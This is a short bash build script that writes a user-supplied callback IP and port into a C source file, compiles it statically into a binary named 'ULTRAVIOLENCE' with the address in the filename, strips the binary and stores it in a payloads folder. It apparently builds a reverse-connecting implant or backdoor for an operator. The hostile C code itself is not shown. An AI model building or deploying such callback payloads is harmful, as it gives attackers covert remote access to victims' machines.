#! /bin/bash

if [ $# -eq 0 ]
then
	echo "Usage:"
	echo "-i <IP>   -- ip to callback to"
	echo "-p <PORT> -- port to callback to"
	echo "-h        -- help menu"
fi
while getopts "i:p:h" opt; do
  case $opt in
    i) IP=${OPTARG};;
    p) PORT=${OPTARG};;
    h) echo "Usage:"
    echo "-i <IP>   -- ip to callback to"
    echo "-p <PORT> -- port to callback to"
    echo "-h        -- help menu";;
  esac
done
if [ -z "$IP" ]
then
	echo "No IP was specified"
	exit
fi
if [ -z "$PORT" ]
then
	echo "No port was specified"
	exit
fi
mkdir payloads
mkdir build
cp main.c build/main.c
cd build
cat main.c | sed -e "s/#define PORT/#define PORT $PORT/g" |sed -e "s/char callback_addr\[\] = {};/char callback_addr\[\] = {\"$IP\"};/g" > payload.c
gcc payload.c -o ULTRAVIOLENCE.$IP.$PORT -static -lpthread -lcrypto -ldl
strip -s ULTRAVIOLENCE.$IP.$PORT
cp ULTRAVIOLENCE.$IP.$PORT ../payloads
rm -rf *
cd ..
rmdir build
